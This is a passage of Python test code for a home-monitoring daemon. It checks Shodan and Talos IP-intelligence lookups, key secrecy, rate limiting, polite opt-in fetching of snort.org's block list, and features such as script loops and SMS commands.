    zigmon.CONFIG.update({'never_block': '45.9.149.0/24'})
    _n = len(_asked)
    assert d.intel_for('45.9.149.8', ask=True, force=True)['shodan'].get('skipped') and len(_asked) == _n, \
        'an address under never kept out was sent to Shodan'
    zigmon.CONFIG.update({'never_block': ''})
    # with a key: the full record, and the key nowhere but the request
    zigmon.CONFIG.update({'intel_shodan_key': 'SeCrEtKeY123'})
    _r = d.intel_for('45.9.149.7', ask=True, force=True)
    assert 'api.shodan.io' in _asked[-1] and _r['shodan'].get('org') == 'Example Hosting', 'the full API was not used with a key'
    assert 'SeCrEtKeY123' not in json.dumps(_r) and 'SeCrEtKeY123' not in json.dumps(d.intel_cache()), 'the key is in an answer'
    zigmon.CONFIG.update({'intel_shodan_key': 'wrongkey'})
    _r = d.intel_for('45.9.149.9', ask=True, force=True)
    assert 'refused' in _r['shodan'].get('error', '') and 'wrongkey' not in json.dumps(_r), 'a refused key was not said, or said too much'
    _log = (_Path(zigmon.CONFIG.get('log_file') or '/nonexistent').read_text() if zigmon.CONFIG.get('log_file') and _Path(zigmon.CONFIG['log_file']).exists() else '')
    assert 'SeCrEtKeY123' not in _log and 'wrongkey' not in _log, 'the Shodan key reached the log'
    assert 'intel_shodan_key' in d.TUNABLE_SECRETS and d.runtime_config().get('intel_shodan_key', {}).get('kind') == 'secret', \
        'the Shodan key is not kept as a secret'
    # Talos: its page, and whether its published list names the address
    zigmon.CONFIG.update({'intel_talos': 1, 'intel_shodan_key': ''})
    _r = d.intel_for('45.9.149.7')
    assert _r['talos']['page'].endswith('45.9.149.7') and 'talosintelligence.com' in _r['talos']['page']
    assert any(f[0] == 'talos' for f in d.FEEDS), 'the Talos list is not among the lists'
    # a block asks in the background when the house wants that
    zigmon.CONFIG.update({'intel_on_block': 1})
    d._intel_cache = {}
    _n = len(_asked)
    d.intel_after_block('45.9.149.20')
    for _i in range(80):
        if len(_asked) > _n: break
        time.sleep(0.05)
    time.sleep(0.3)
    assert len(_asked) > _n and d.intel_cache().get('45.9.149.20'), 'a block did not ask about the address'
    # a burst of them is a queue rather than two at a time and the rest lost:
    # a scan blocks a dozen addresses in a second, and the list used to show
    # nothing beside any of them until each was opened by hand
    d._intel_cache = {}
    _n = len(_asked)
    _burst = ['45.9.149.%d' % n for n in range(40, 52)]
    for _ip in _burst:
        d.intel_after_block(_ip)
    for _i in range(400):
        if all(d.intel_cache().get(x) for x in _burst):
            break
        time.sleep(0.05)
    _missing = [x for x in _burst if not d.intel_cache().get(x)]
    assert not _missing, 'a burst of blocks left %d address(es) unasked: %r' % (len(_missing), _missing[:4])
    # what came back is kept, so the next block of the same address asks nothing
    _n = len(_asked)
    d.intel_after_block(_burst[0])
    time.sleep(0.6)
    assert len(_asked) == _n, 'an address already asked about was asked again'
    # a whole subnet is not a thing Shodan knows, and the house's own is
    # nobody else's business
    _n = len(_asked)
    d.intel_after_block('92.118.39.0/24')
    d.intel_after_block('192.168.40.10')
    time.sleep(0.4)
    assert len(_asked) == _n, 'a subnet or a house address was sent to Shodan'
    # and every address already being kept out is filled in by itself
    d._intel_cache = {}
    d.store.unblock()
    for _ip in ('45.9.149.60', '45.9.149.61'):
        d.store.block(_ip, None, 'a test', auto=True)
    _asked_now = d.intel_backfill()
    assert _asked_now == 2, 'the sweep queued %d of two' % _asked_now
    for _i in range(200):
        if all(d.intel_cache().get(x) for x in ('45.9.149.60', '45.9.149.61')):
            break
        time.sleep(0.05)
    assert all(d.intel_cache().get(x) for x in ('45.9.149.60', '45.9.149.61')), \
        'the sweep did not fill in the addresses being kept out'
    assert d.intel_backfill() == 0, 'the sweep asked again about what it had just asked'
    d.store.unblock()
finally:
    _ur.urlopen = _real_open
    zigmon.CONFIG.update(_was_intel)
    d._intel_cache = {}
print('Shodan is asked only when switched on and never about the house, the key stays out of every answer, and Talos comes as its list and its page')



# ---------------------------------------------------------------------------
# A key added after InternetDB had answered: the next question goes to the
# API, not to a week-old short answer; the whole record is read, services and
# all; the API's one question a second is kept, and a "too many" is waited
# out rather than shown. And the Talos list: gone from where it was, said so
# in words that help, not asked again every half minute, and takeable from a
# file this machine keeps.
# ---------------------------------------------------------------------------
import tempfile
_asked2 = []
_busy = {'n': 0}
def _fake_open2(req, timeout=None):
    url = req.full_url if hasattr(req, 'full_url') else str(req)
    _asked2.append((time.time(), url))
    if 'snort.org' in url or 'talosintelligence' in url:
        raise _ue.HTTPError(url, 403, 'Forbidden', {}, _io.BytesIO(b''))
    if 'api.shodan.io' in url:
        if '45.9.149.30' in url and _busy['n'] < 2:
            _busy['n'] += 1
            raise _ue.HTTPError(url, 429, 'Too Many Requests', {}, _io.BytesIO(b'{}'))
        return _Resp(json.dumps({'ip_str': '45.9.149.7', 'ports': [22, 443], 'org': 'Example Hosting',
                                 'city': 'Amsterdam', 'domains': ['example.net'],
                                 'data': [{'port': 443, 'transport': 'tcp', 'product': 'nginx', 'version': '1.18.0',
                                           'http': {'title': 'Welcome', 'server': 'nginx/1.18.0', 'status': 200,
                                                    'components': {'Grafana': {}}},
                                           'ssl': {'cert': {'subject': {'CN': 'x.example.net'}, 'issuer': {'O': 'R3 Org'},
                                                            'expires': '20251101120000Z', 'expired': True},
                                                   'versions': ['TLSv1.3', '-SSLv3']},
                                           'vulns': {'CVE-2021-23017': {'cvss': 7.7, 'verified': True,
                                                                        'summary': 'nginx resolver off-by-one'}},
                                           '_shodan': {'module': 'https'},
                                           'timestamp': '2026-09-18T10:00:00'},
                                          {'port': 22, 'transport': 'tcp', 'product': 'OpenSSH', 'version': '8.2p1',
                                           'cpe23': ['cpe:2.3:a:openbsd:openssh:8.2']}]}))
    return _Resp(json.dumps({'ip': '45.9.149.7', 'ports': [22], 'hostnames': [], 'tags': [], 'vulns': [], 'cpes': []}))
_was_intel = {k: zigmon.CONFIG.get(k) for k in ('intel_shodan', 'intel_shodan_key', 'intel_talos', 'feeds', 'feed_talos_url')}
_ur.urlopen = _fake_open2
try:
    d._intel_cache = {}
    zigmon.CONFIG.update({'intel_shodan': 1, 'intel_shodan_key': ''})
    assert d.intel_for('45.9.149.7', ask=True)['shodan']['via'] == 'Shodan InternetDB'
    zigmon.CONFIG.update({'intel_shodan_key': 'SeCrEtKeY123'})
    assert d.intel_for('45.9.149.7')['shodan']['via'] == 'Shodan InternetDB', 'the kept answer was lost just by looking'
    _r = d.intel_for('45.9.149.7', ask=True)['shodan']
    assert _r['via'] == 'the Shodan API', 'a key added later went on showing the InternetDB answer: %r' % _r
    assert 'minify' not in _asked2[-1][1], 'the minified record was asked for, which has no services'
    _svc = {x['port']: x for x in _r.get('services') or []}
    assert _svc.get(443, {}).get('product') == 'nginx' and _svc[443].get('cert') == 'x.example.net' \
        and _svc[443].get('title') == 'Welcome' and _svc.get(22, {}).get('version') == '8.2p1', _r
    assert 'CVE-2021-23017' in _r['vulns'] and _r['city'] == 'Amsterdam' and _r['domains'] == ['example.net'], _r
    _v = (_r.get('vuln_info') or [{}])[0]
    assert _v.get('id') == 'CVE-2021-23017' and _v.get('cvss') == 7.7 and _v.get('verified') \
        and 'resolver' in _v.get('summary', '') and _v.get('ports') == [443], _r.get('vuln_info')
    assert _svc[443].get('status') == 200 and _svc[443].get('tech') == ['Grafana'] \
        and _svc[443].get('issuer') == 'R3 Org' and _svc[443].get('expired') and _svc[443].get('tls') == ['TLSv1.3'], _svc[443]
    # every setting marked as needing the internet is one the page draws
    _page = (Path(__file__).resolve().parent.parent / 'web' / 'index.php').read_text()
    _net = re.search(r'var NEEDS_NET = \{(.*?)\n\};', _page, re.S).group(1)
    for _key in re.findall(r"^\s+([a-z_]+):", _net, re.M):
        assert "['%s'," % _key in _page, 'marked as needing the internet but not drawn: %s' % _key
    for _key in ('weather', 'feeds', 'geo', 'intel_shodan', 'intel_on_block', 'intel_talos', 'notify_ntfy', 'duo_host'):
        assert re.search(r'^\s+%s:' % _key, _net, re.M), '%s needs the internet and is not marked' % _key
    assert 'SeCrEtKeY123' not in json.dumps(_r)
    # a burst of questions: one a second, and a "too many" waited out
    _asked2[:] = []
    for _ip in ('45.9.149.31', '45.9.149.32', '45.9.149.30'):
        _a = d.intel_for(_ip, ask=True, force=True)['shodan']
        assert not _a.get('error'), '%s: %r' % (_ip, _a)
    _t = [t for t, u in _asked2 if 'api.shodan.io' in u]
    assert len(_t) == 5 and all(b - a >= 1.0 for a, b in zip(_t, _t[1:])), \
        'the API was asked faster than once a second: %r' % [round(b - a, 2) for a, b in zip(_t, _t[1:])]
    # the Talos list, from an address of its own that refuses it
    zigmon.CONFIG.update({'feeds': 'talos', 'feed_talos_url': 'https://snort.org/downloads/ip-block-list'})
    d.store.set_meta('feed_error_talos', '')
    d.store.set_meta('feed_at_talos', '0')
    _got, _words = d.feed_fetch('talos')
    assert not _got and 'snort.org' in _asked2[-1][1] and 'terms' in _words, (_asked2[-1], _words)
    assert (d._feed_error('talos') or {}).get('words') == _words, 'the failure was not remembered'
    _n = len(_asked2)
    d.feeds_due()
    assert len(_asked2) == _n, 'a list that just failed was asked again at once'
    _tf = _Path(tempfile.mkdtemp()) / 'talos.txt'
    _tf.write_text('# Talos\n45.9.151.1\n45.9.151.2\n')
    zigmon.CONFIG.update({'feed_talos_url': str(_tf)})
    _got, _words = d.feed_fetch('talos')
    assert _got == 2 and d.store.in_feed('talos', '45.9.151.2') and not d._feed_error('talos'), _words
finally:
    _ur.urlopen = _real_open
    zigmon.CONFIG.update(_was_intel)
    d._intel_cache = {}
print('a Shodan key is used from the moment it is there, for the whole record, one question a second; '
      'the Talos list says why it failed, waits an hour, and can come from a file')


# The ten-minute spacing between fetches from snort.org and the count of
# requests in a minute (4.85.0) are guarded on their own further down. The
# shapes of snort.org tried here are fetched one after another on purpose,
# so for them both are out of the way.
d.SNORT_BETWEEN_S = 0
d.SNORT_PER_MINUTE = 99
# ---------------------------------------------------------------------------
# snort.org's click-to-accept, pressed from here: a house that has said it
# accepts the terms gets the list by itself, like every other list. Both
# shapes the page could take - a form, or the link Rails writes for a button
# - and a page that offers neither, which falls back to a file and says so.
# ---------------------------------------------------------------------------
import http.server as _hs, threading as _th
_LIST = '# Cisco Talos\n45.9.152.1\n45.9.152.2\n45.9.152.3\n'
_TERMS = ('<html><head><meta name="csrf-token" content="TOK-42"></head><body>'
          '<h1>Testing IP Block List Terms and Conditions</h1>%s</body></html>')
_FORM = ('<form action="/downloads/ip-block-list/accept" method="post">'
         '<input type="hidden" name="authenticity_token" value="TOK-42">'
         '<input type="submit" value="Accept"></form>')
_LINK = '<a data-method="post" href="/downloads/ip-block-list/accept">Accept</a>'
# a form that carries no token of its own: the only one on the page is the
# meta tag a browser would read, and the site will not take a post without it
_META = '<form action="/downloads/ip-block-list/accept" method="post"><button>Accept</button></form>'
class _Snort(_hs.BaseHTTPRequestHandler):
    shape = 'form'
    seen = []
    def log_message(self, *a): pass
    def _ok(self, body, kind='text/plain', cookie=None):
        raw = body.encode()
        self.send_response(200)
        self.send_header('Content-Type', kind)
        self.send_header('Content-Length', str(len(raw)))
        if cookie:
            self.send_header('Set-Cookie', cookie)
        self.end_headers()
        self.wfile.write(raw)
    def _accepted(self):
        return 'ip_block_list=accepted' in (self.headers.get('Cookie') or '')
    def do_GET(self):
        _Snort.seen.append(('GET', self.path, self._accepted()))
        if self.path.endswith('/terms'):
            return self._ok(_TERMS % {'form': _FORM, 'link': _LINK, 'meta': _META,
                                      'none': '<p>read them</p>'}[_Snort.shape], 'text/html')
        if self._accepted():
            return self._ok(_LIST)
        return self._ok(_TERMS % '<p>accept first</p>', 'text/html')
    def do_POST(self):
        length = int(self.headers.get('Content-Length') or 0)
        body = self.rfile.read(length).decode()
        _Snort.seen.append(('POST', self.path, body))
        if 'TOK-42' not in body and _Snort.shape in ('form', 'meta'):
            return self._ok('no token', 'text/html')
        self._ok(_TERMS % '<p>thank you</p>', 'text/html', cookie='ip_block_list=accepted; Path=/')
_srv = _hs.HTTPServer(('127.0.0.1', 0), _Snort)
_th.Thread(target=_srv.serve_forever, daemon=True).start()
_snort = 'http://127.0.0.1:%d/downloads/ip-block-list' % _srv.server_address[1]
_was_snort = (zigmon.Daemon.FEEDS, dict(zigmon.CONFIG))
_feeds = tuple((f[0], f[1], f[2], _snort if f[0] == 'talos' else f[3]) for f in zigmon.Daemon.FEEDS)
zigmon.Daemon.FEEDS = _feeds
try:
    zigmon.CONFIG.update({'feeds': 'talos', 'feed_talos_url': '', 'feed_talos_accept': 0})
    d.SNORT_TERMS = _snort + '/terms'
    for _k in ('snort_cookies', 'feed_etag_talos', 'feed_modified_talos', 'feed_wait_talos'):
        d.store.set_meta(_k, '')
    d.store.set_meta('feed_error_talos', ''); d.store.set_meta('feed_at_talos', '0')
    # nobody has accepted anything: nothing is pressed, and it says what to do
    _got, _words = d.feed_fetch('talos')
    assert not _got and 'tick' in _words and 'terms' in _words, _words
    assert not [x for x in _Snort.seen if x[0] == 'POST'], 'the terms were accepted without being accepted'
    # with the switch on: the form is filled in, with the page's own token
    zigmon.CONFIG['feed_talos_accept'] = 1
    for _shape in ('form', 'link', 'meta'):
        _Snort.shape = _shape
        _Snort.seen = []
        d.store.put_feed('talos', [])
        # each shape from nothing: the session one kept would otherwise be
        # agreed already, and there would be no Accept to press
        d.store.set_meta('snort_cookies', '')
        _got, _words = d.feed_fetch('talos')
        assert _got == 3, '%s: %s' % (_shape, _words)
        assert d.store.in_feed('talos', '45.9.152.2'), _shape
        _posts = [x for x in _Snort.seen if x[0] == 'POST']
        assert len(_posts) == 1 and 'TOK-42' in _posts[0][2], '%s: %r' % (_shape, _Snort.seen)
        assert _Snort.seen[-1][0] == 'GET' and _Snort.seen[-1][2], 'the list was not asked for again with the cookie'
    # a page that offers no way to accept: said plainly, not guessed at
    _Snort.shape = 'none'
    _Snort.seen = []
    d.store.set_meta('feed_at_talos', '0')
    d.store.set_meta('snort_cookies', '')
    _got, _words = d.feed_fetch('talos')
    assert not _got and 'wget' in _words and 'Where the Talos list comes from' in _words, _words
    assert not [x for x in _Snort.seen if x[0] == 'POST'], 'something was posted to a page with no Accept'
finally:
    zigmon.Daemon.FEEDS = _was_snort[0]
    zigmon.CONFIG.clear(); zigmon.CONFIG.update(_was_snort[1])
    _srv.shutdown()
    d.store.put_feed('talos', [])
print('the Talos list accepts snort.org\'s terms in your name and fetches itself, or says why it cannot')


# snort.org as a polite client. The list changes in months (the copy in
# September 2026 was last changed in May), yet it was asked for every hour,
# each time with an empty cookie jar - so every hour the terms were agreed to
# afresh, three or four requests at a time, until Cloudflare answered
# "too many requests" and kept answering it.
#   - the session is kept, so the Accept is pressed once, not every time
#   - the list is asked for with what it was, so unchanged is "not modified"
#   - a 429 is a wait for as long as the site says (Retry-After)
#   - and snort.org itself is asked twice a day at most
class _Polite(_hs.BaseHTTPRequestHandler):
    seen = []
    mode = 'ok'
    wait = '7200'
    def log_message(self, *a): pass
    def _send(self, code, body=b'', kind='text/plain', extra=None):
        self.send_response(code)
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        if code != 304:
            self.send_header('Content-Type', kind)
            self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        if code != 304:
            self.wfile.write(body)
    def do_GET(self):
        ok = 'session=agreed' in (self.headers.get('Cookie') or '')
        _Polite.seen.append(('GET', self.path, ok, self.headers.get('If-None-Match') or ''))
        if _Polite.mode == '429':
            return self._send(429, b'slow down', extra={'Retry-After': _Polite.wait})
        if self.path.endswith('/terms'):
            return self._send(200, (_TERMS % _FORM).encode(), 'text/html')
        if not ok:
            return self._send(200, (_TERMS % '<p>accept first</p>').encode(), 'text/html')
        if self.headers.get('If-None-Match') == '"v1"':
            return self._send(304)
        return self._send(200, _LIST.encode(), extra={'ETag': '"v1"',
                                                      'Last-Modified': 'Wed, 13 May 2026 20:16:07 GMT'})
    def do_POST(self):
        n = int(self.headers.get('Content-Length') or 0)
        _Polite.seen.append(('POST', self.path, self.rfile.read(n).decode(), ''))
        self._send(200, (_TERMS % '<p>thank you</p>').encode(), 'text/html',
                   extra={'Set-Cookie': 'session=agreed; Path=/; Max-Age=31536000'})
_psrv = _hs.HTTPServer(('127.0.0.1', 0), _Polite)
_th.Thread(target=_psrv.serve_forever, daemon=True).start()
_purl = 'http://127.0.0.1:%d/downloads/ip-block-list' % _psrv.server_address[1]
_was_polite = (zigmon.Daemon.FEEDS, dict(zigmon.CONFIG), d.SNORT_TERMS)
zigmon.Daemon.FEEDS = tuple((f[0], f[1], f[2], _purl if f[0] == 'talos' else f[3])
                            for f in zigmon.Daemon.FEEDS)
try:
    zigmon.CONFIG.update({'feeds': 'talos', 'feed_talos_url': '', 'feed_talos_accept': 1,
                          'feeds_every_h': 1})
    d.SNORT_TERMS = _purl + '/terms'
    for _k in ('snort_cookies', 'feed_etag_talos', 'feed_modified_talos', 'feed_wait_talos',
               'feed_error_talos'):
        d.store.set_meta(_k, '')
    d.store.set_meta('feed_at_talos', '0')
    d.store.put_feed('talos', [])
    # the first time: the terms are agreed to, once
    _Polite.seen = []
    _got, _words = d.feed_fetch('talos')
    assert _got == 3, _words
    assert len([x for x in _Polite.seen if x[0] == 'POST']) == 1, _Polite.seen
    # the second time: the session is still held - no terms, no Accept, just the
    # list, asked for with what it was, and it has not changed
    _Polite.seen = []
    d.store.set_meta('feed_at_talos', '0')
    _got, _words = d.feed_fetch('talos')
    assert not [x for x in _Polite.seen if x[0] == 'POST'], \
        'the terms were agreed to again: the session was not kept: %r' % _Polite.seen
    assert len(_Polite.seen) == 1 and _Polite.seen[0][2], \
        'more than one request, or one without the session: %r' % _Polite.seen
    assert _Polite.seen[0][3] == '"v1"', 'the list was not asked for with what it was last time'
    assert _got == 3 and 'unchanged' in _words, 'an unchanged list was not said to be unchanged: %s' % _words
    assert d.store.in_feed('talos', '45.9.152.2'), 'an unchanged list lost its ranges'
    assert 'session=agreed' not in open(zigmon.CONFIG.get('log_file') or '/dev/null', errors='ignore').read() \
        if zigmon.CONFIG.get('log_file') and Path(zigmon.CONFIG['log_file']).exists() else True, \
        'the session was written to the log'
    # snort.org itself twice a day at most, even when the lists are hourly
    _Polite.seen = []
    d.store.set_meta('feed_at_talos', str(int(time.time() - 2 * 3600)))
    d.feeds_due()
    assert not _Polite.seen, 'snort.org was asked again two hours later: %r' % _Polite.seen
    d.store.set_meta('feed_at_talos', str(int(time.time() - 13 * 3600)))
    d.feeds_due()
    assert _Polite.seen, 'snort.org was not asked again after thirteen hours'
    # a 429 is a wait for as long as the site says, and nothing asks sooner
    _Polite.mode = '429'
    _Polite.wait = '7200'
    _Polite.seen = []
    d.store.set_meta('feed_at_talos', '0')
    _got, _words = d.feed_fetch('talos')
    assert not _got and 'asked us to wait' in _words, _words
    _until = float(d.store.get_meta('feed_wait_talos') or 0)
    assert 7000 < _until - time.time() < 7300, 'Retry-After was not the wait: %s' % (_until - time.time())
    _Polite.seen = []
    _got, _words = d.feed_fetch('talos')                 # a button pressed during the wait
    assert not _Polite.seen, 'snort.org was asked again during its own wait'
    assert 'wait until' in _words, _words
    d.feeds_due()
    assert not _Polite.seen, 'the clock asked snort.org again during its own wait'
    # a nonsense Retry-After is held between a minute and a day
    assert d._retry_after('0') == 60 and d._retry_after('9999999') == 86400
    assert d._retry_after('not a date') is None and d._retry_after(None) is None
finally:
    zigmon.Daemon.FEEDS = _was_polite[0]
    zigmon.CONFIG.clear(); zigmon.CONFIG.update(_was_polite[1])
    d.SNORT_TERMS = _was_polite[2]
    _psrv.shutdown()
    d.store.put_feed('talos', [])
    for _k in ('snort_cookies', 'feed_etag_talos', 'feed_modified_talos', 'feed_wait_talos'):
        d.store.set_meta(_k, '')
print('snort.org is asked twice a day, keeps its session, asks only for a changed list, and waits when told')
del d.SNORT_BETWEEN_S, d.SNORT_PER_MINUTE
d.store.set_meta('snort_asked', '')
d.store.set_meta('snort_tried_at', '')


# The page as snort.org really writes it, kept as it came out of a browser
# (tokens taken out). Pressing Accept has to go to the form Cisco means, not
# to the first form on the page that happens to hold the word: the search box
# carries accept-charset="UTF-8", and posting the terms to /search is how a
# careless reading of "accept" ends up looking like a refusal.
_real = (Path(__file__).resolve().parent / 'pages' / 'snort-terms.html').read_text()
_went = []
def _press(where, data=None, referer=''):
    _went.append((where, (data or b'').decode()))
    return ('<html>thanks</html>', where)
assert d._press_accept(_press, _real, 'https://snort.org/downloads/ip-block-list/terms'), \
    'the Accept on the real terms page was not found'
assert len(_went) == 1, _went
_where, _sent = _went[0]
assert _where == 'https://snort.org/downloads/ip-block-list/accept-terms', \
    'Accept went to %r' % _where
assert 'authenticity_token=TOKEN-FROM-THE-FORM' in _sent, 'the form\'s own token was not sent: %r' % _sent
assert 'utf8' not in _sent, 'it sent the search box\'s fields: %r' % _sent
# and the search form on its own is not an Accept at all
_only_search = '<form id="snort_search_form" action="/search" accept-charset="UTF-8" method="get">' \
    '<input name="utf8" type="hidden" value="x"><input type="text" name="q"></form>'
assert not d._accept_forms(_only_search), 'a search box was taken for an Accept button'
print('the Accept on snort.org\'s own terms page is the one that is pressed, with its own token')


# A box being switched is not polled: on a four-socket strip switched as one
# scene, the poll that landed among the four commands was the request too
# many in the box's second, and the fourth socket was refused and moved a
# second late. The read that confirms the switch waits for the burst to end.
class _Busy(object):
    name = 'Strip-1'; last_poll = 0.0; backoff_until = 0.0; cfg = {'host': '10.9.9.9', 'switch_id': 0}
    def rpc(self):
        raise AssertionError('a box being switched was polled')
zigmon.ShellyRPC._cmd_at['10.9.9.9'] = time.time()
assert zigmon.ShellyRPC.commanding('10.9.9.9', 3.0), 'a box just switched does not count as being switched'
d.poll_plug(_Busy())
d.poll_plug_group([_Busy(), _Busy()])
zigmon.ShellyRPC._cmd_at['10.9.9.9'] = time.time() - 10
assert not zigmon.ShellyRPC.commanding('10.9.9.9', 3.0), 'a box switched ten seconds ago still counts as busy'
zigmon.ShellyRPC._cmd_at.pop('10.9.9.9', None)
print('a box being switched is left alone by the polling until the burst is over')


# A loop inside a loop in a SCRIPT keeps its own place. Every loop shares one
# set of names - which is what makes "let" carry from turn to turn, and what
# makes a "while" move at all - so the inner loop's own {loop_i}, {loop_n},
# {loop_first} and {loop_last} were left behind over the outer loop's. After
# a nested loop the outer loop believed it was on its last turn, and a line
# quoting {loop_first} was skipped altogether because the name stood for
# nothing: the words never came out.
_o = d.run_script({'name': 'Nested', 'body': (
    'for a in one, two\n'
    'say outer {loop_i} of {loop_n} : {a}\n'
    'for b in x, y\n'
    'say inner {loop_i}\n'
    'end\n'
    'say after {loop_i} of {loop_n} : {a}\n'
    'end')}, {}, origin='a test')
_said = _o.get('said')
_lines = _said.split('\n') if isinstance(_said, str) else list(_said)
assert _lines == ['outer 1 of 2 : one', 'inner 1', 'inner 2', 'after 1 of 2 : one',
                  'outer 2 of 2 : two', 'inner 1', 'inner 2', 'after 2 of 2 : two'], \
    'a loop inside a loop left the outer loop somewhere else: %r' % (_lines,)
# ...and a name a "let" makes still carries from turn to turn, which is the
# whole reason the loops share one set of names
_o = d.run_script({'name': 'Counting', 'body': (
    'let n 0\n'
    'for x in a, b, c\n'
    'let n {n.add:1}\n'
    'end\n'
    'say counted {n}')}, {}, origin='a test')
_said = _o.get('said')
assert 'counted 3' in (_said if isinstance(_said, str) else '\n'.join(_said)), \
    'a let no longer carries from one turn to the next: %r' % (_said,)
print('a loop inside a script loop leaves the outer loop where it was, and let still carries')


# A loop's own name stands for a device inside a script, as it already did
# inside a message. The name was handed to the filling among the facts rather
# than in a scope, and only the scope was consulted, so "for x in …" then
# "say {x} is at {x.battery}" looked for a device actually called x and said
# nothing at all - while the very same two lines in a message worked.
_pair = (('Loop-Sensor-A', 61), ('Loop-Sensor-B', 22))
d.handle('zigbee2mqtt/bridge/devices', json.dumps(
    [{'ieee_address': '0x' + _n.lower().replace('-', ''), 'type': 'EndDevice', 'friendly_name': _n,
      'definition': {'model': 'X', 'vendor': 'Y', 'exposes': [
          {'access': 5, 'label': 'Battery', 'name': 'battery', 'property': 'battery',
           'type': 'numeric', 'unit': '%'}]}} for _n, _ in _pair]).encode())
d.devices_settled(5.0)                       # the list is taken in on its own worker now
for _n, _level in _pair:
    d.handle('zigbee2mqtt/' + _n, json.dumps({'battery': _level}).encode())
_o = d.run_script({'name': 'Batteries', 'body': (
    'for x in Loop-Sensor-A, Loop-Sensor-B\nsay {x} at {x.battery}\nend')}, {}, origin='a test')
_said = _o.get('said')
_text = _said if isinstance(_said, str) else '\n'.join(_said)
assert 'Loop-Sensor-A at 61' in _text and 'Loop-Sensor-B at 22' in _text, \
    'a loop\u2019s own name did not read its device inside a script: %r' % (_text,)
# the same two lines in a message have always worked, and still do
assert d.fill_message('{for x in Loop-Sensor-A, Loop-Sensor-B}{x}={x.battery} {end}',
                      d.message_facts('a test')) == 'Loop-Sensor-A=61 Loop-Sensor-B=22', \
    'a loop\u2019s own name stopped reading its device inside a message'
print('a loop\u2019s own name reads a device inside a script, as it does inside a message')


# {events_today} is counted in the database, over the whole day. It used to
# read the newest four hundred rows and count the ones inside the day, so any
# day busier than four hundred events reported four hundred - and it fetched
# four hundred rows every time a message was previewed, which the editor asks
# for on every keystroke.
d.store.flush()
for _i in range(420):
    d.store.add_event('audit', 'a counted event %d' % _i, 'info')
d.store.flush()                                   # the writing is a thread of its own
_day = time.time() - 86400
_truth = len([_e for _e in d.store.events(20000) if (_e.get('ts') or 0) > _day])
assert _truth > 400, 'the check needs more than four hundred events to mean anything: %d' % _truth
assert d.message_facts('a test')['events_today'] == _truth, \
    '{events_today} said %r of %d events today' % (d.message_facts('a test')['events_today'], _truth)
assert d.store.events_since(_day) == _truth, \
    'the database counted %d of %d' % (d.store.events_since(_day), _truth)
print('{events_today} counts every event of the day, not the newest four hundred')


# {blocked_today} counts the list AND the history. Counting only the list
# said "kept out and still kept out": with the usual hour-long ban everything
# older than an hour had already been swept into the history, so a day that
# kept out dozens reported almost none of them.
d.store.unblock()
_day = time.time() - 86400
_was = d.store.blocked_since(_day)                # whatever earlier checks left behind
d.store.block('203.0.113.41', time.time() + 600, 'still out')
d.store.block('203.0.113.42', time.time() + 600, 'also still out')
d.store.block('203.0.113.43', time.time() + 600, 'about to run out')
d.store.unblock('203.0.113.43', 'ran out')        # into the history, off the list
assert d.store.blocked_since(_day) - _was == 3, \
    'an address that ran out today was not counted: %d of 3' % (d.store.blocked_since(_day) - _was)
d.store.block('203.0.113.43', time.time() + 600, 'and out again')
assert d.store.blocked_since(_day) - _was == 3, \
    'an address kept out twice in a day was counted twice'
assert d.store.blocked_since(time.time() + 60) == 0, 'something was counted from the future'
d.store.unblock()
print('{blocked_today} counts what was kept out today, whether or not it is still out')


# The Shodan queue must always have somebody working it. An address already
# in the queue was turned back at the door - before the code that starts a
# worker - so a queue whose worker had gone after its five quiet minutes was
# never emptied: nothing more was asked about any address until some address
# nobody had seen before was blocked.
zigmon.CONFIG.update({'intel_on_block': 1, 'intel_shodan': 1})
d._intel_queue[:] = []
d._intel_worker = None
d.intel_ask_later('185.36.81.23')
assert d._intel_worker and d._intel_worker.is_alive(), 'nothing was started to empty the queue'
_first = d._intel_worker
d._intel_queue[:] = ['185.36.81.23']          # as if it were still waiting its turn
d._intel_worker = None                        # ...and the worker had gone
d.intel_ask_later('185.36.81.23')             # the very same address
assert d._intel_worker and d._intel_worker.is_alive(), \
    'an address already in the queue left the queue with nobody working it'
d._intel_queue[:] = []
zigmon.CONFIG.update({'intel_on_block': 0, 'intel_shodan': 0})
print('the Shodan queue always has somebody working it, even when the address is already in it')


# snort.org's Accept, on a page that writes value before name. The two
# readings of a hidden field hand back their pairs in opposite orders, and
# the second went in as it came: the CSRF token became the NAME of a field
# and the field's name its value, which no Rails page will take.
_sent = []
_page = ('<form action="/downloads/ip-block-list/accept-terms" method="post">'
         '<input type="hidden" value="&#x2713;" name="utf8" />'
         '<input type="hidden" value="TOKEN-VALUE" name="authenticity_token" />'
         '<input type="submit" name="commit" value="Accept" /></form>')
assert d._press_accept(lambda url, data=None, referer=None: _sent.append((url, (data or b'').decode())),
                       _page, 'https://snort.org/downloads/ip-block-list/terms'), \
    'the Accept was not pressed at all'
assert len(_sent) == 1, _sent
_body = _sent[0][1]
assert 'authenticity_token=TOKEN-VALUE' in _body, \
    'the token was not sent as the token: %r' % _body
assert 'utf8=%E2%9C%93' in _body or 'utf8=' in _body, 'the field names came out backwards: %r' % _body
assert 'TOKEN-VALUE=' not in _body, 'the token was sent as a field NAME: %r' % _body
print('a terms page that writes value before name is still accepted properly')


# ---------------------------------------------------------------------------
# What a text message can do with no command written at all. Families, not a
# fixed list: what each one covers is whatever the house holds at the moment
# it is asked, so a thermometer put up this morning can be asked about this
# afternoon - with a switch of its own, and nothing to rewrite.
_rows = d.sms_system_rows()
assert len(_rows) >= 15, 'only %d built-in command(s)' % len(_rows)
assert {r['key'] for r in _rows} == {r[0] for r in d.SMS_FAMILIES}, 'a family went missing'
for _r in _rows:
    assert _r['topic'] and _r['phrase'] and _r['what'] and _r['example'], \
        '%s says too little: %r' % (_r['key'], _r)
    assert len(_r['what']) <= 120, '%s says too much for a card: %d characters' % (_r['key'], len(_r['what']))
    assert _r['enabled'] is True, '%s starts switched off' % _r['key']
assert d.sms_system_topics(), 'no topics at all'
# the families that cover things really do fill themselves from the house
_rooms = {r['id'] for r in d.rooms()}
_covering = [r for r in _rows if r['covers'] == 'rooms']
assert _covering, 'no family covers the rooms'
for _r in _covering:
    assert {m['id'] for m in _r['members']} == _rooms, \
        '%s covers %r rather than the rooms the house has' % (_r['key'], [m['id'] for m in _r['members']])
print('%d built-in command(s) in %d topic(s), each filling itself from the house'
      % (len(_rows), len(d.sms_system_topics())))


# A switch per command, and a switch per thing. Switching one room off leaves
# every other room working, and switching a whole family off leaves the rest
# of its topic alone.
